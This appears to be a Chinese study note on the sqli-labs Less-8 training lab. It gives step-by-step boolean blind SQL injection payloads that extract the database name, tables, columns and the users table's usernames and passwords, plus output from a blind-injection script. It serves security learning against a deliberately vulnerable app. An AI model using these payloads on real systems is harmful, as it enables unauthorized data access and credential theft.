---
title: less8
url: https://www.yuque.com/u29002979/ep2zrx/spy5gva53wcy2v2s
---

```bash
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

`?id=1'`没有报错显示，报错注入不能够实现注入了。
`?id=1`显示You are in...........
&#x20;对和错返回不同的页面回显，可以采用**布尔盲注**的方式， <a name="WUqxX"></a>

# 布尔盲注

<a name="MJTYd"></a>

## 判断字段数

`?id=1' order by 4 --+`没有显示报错
`?id=1' order by 3 --+`显示You are in
&#x20;由此可以判断**字段数为3  ** <a name="cU19o"></a>

## 判断数据库名称长度

`?id=-1 or length(database())>8 --+`无内容
`?id=-1 or length(database())=8`有内容
说明**数据库长度为8**

> 一般采用逻辑或，因为无法确保前面的条件一定为真

<a name="frb3M"></a>

### 逐一猜解数据库名称

<a name="a5hHH"></a>

#### ascii表（部分）

| 97 | a |
| --- | --- |
| 98 | b |
| 99 | c |
| 100 | d |
| 101 | e |
| 102 | f |
| 103 | g |
| 104 | h |
| 105 | i |
| 106 | j |
| 107 | k |
| 108 | l |
| 109 | m |
| 110 | n |
| 111 | o |
| 112 | p |
| 113 | q |
| 114 | r |
| 115 | s |
| 116 | t |
| 117 | u |
| 118 | v |
| 119 | w |
| 120 | x |
| 121 | y |
| 122 | z |

`?id=-1' or ascii(substr(database(),1,1))>115--+`无
`?id=-1' or ascii(substr(database(),1,1))=115--+`有
第一个字符是s
...
或者
` ?id=-1' or **ascii**(mid(database(),1,1))=115--+`有&#x20;
...
或者
`?id=-1' or mid(database(),1,1)='s'--+ `有
...

> **MID函数**表示按照指定的条件对字符串进行截取。
> 语法结构：=MID(目标单元格，开始位置，截取长度)
> 注意：该函数的提取方法是从左往右提取指定的数据。

<br />
<a name="SzUFc"></a>
## 猜解数据表名称
`?id=-1' or ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=101--+`<br />第一个字符是e
<a name="Y2AQJ"></a>

## 猜解字段名称

`?id=-1' or ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))=105--+`<br />第一个字符是i
<a name="RNwwH"></a>

## 猜解字段内容

`?id=-1' or ascii(mid((select group_concat(username,0x7e,password) from users),1,1))=68--+`<br />第一个字符是D

对于布尔盲注的问题，一般采用脚本进行猜解或者使用sqlmap\ <a name="kRQp0"></a>

# 使用python布尔盲注脚本

```bash
┌──(root?guoyx)-[/home/kali/sql-python]
└─# python3 bool-blind.py    
[-]开始测试数据库名长度.......
[+]数据库长度：8

[-]开始测试数据库名.......
[+]数据库名：security

开始测试security数据库有几张表........
[+]security库一共有4张表

[-]开始猜解表名.......
第1张表名长度：6
[+]：emails
第2张表名长度：8
[+]：referers
第3张表名长度：7
[+]：uagents
第4张表名长度：5
[+]：users

[+]security库下的4张表：['emails', 'referers', 'uagents', 'users']

[-]开始猜解每张表的字段数：.......
[+]emails表	2个字段
[+]referers表	3个字段
[+]uagents表	4个字段
[+]users表	3个字段

[+]表对应的字段数：[2, 3, 4, 3]

[-]开始猜解每张表的字段名.......

[+]emails表的字段：
[+]：id
[+]：email_id

[+]referers表的字段：
[+]：id
[+]：referer
[+]：ip_address

[+]uagents表的字段：
[+]：id
[+]：uagent
[+]：ip_address
[+]：username

[+]users表的字段：
[+]：id
[+]：username
[+]：password

[-]对users表的['id', 'username', 'password']字段进行爆破.......


[+]users表中的id字段有以下13条数据：
[+]1
[+]2
[+]3
[+]4
[+]5
[+]6
[+]7
[+]8
[+]9
[+]10
[+]11
[+]12
[+]14

[+]users表中的username字段有以下13条数据：
[+]Dumb
[+]Angelina
[+]Dummy
[+]secure
[+]stupid
[+]superman
[+]batman
[+]admin
[+]admin1
[+]admin2
[+]admin3
[+]dhakkan
[+]admin4

[+]users表中的password字段有以下13条数据：
[+]Dumb
[+]I-kill-you
[+]p@ssword
[+]crappy
[+]stupidity
[+]genious
[+]mob!le
[+]admin
[+]admin1
[+]admin2
[+]admin3
[+]dumbo
[+]admin4
```
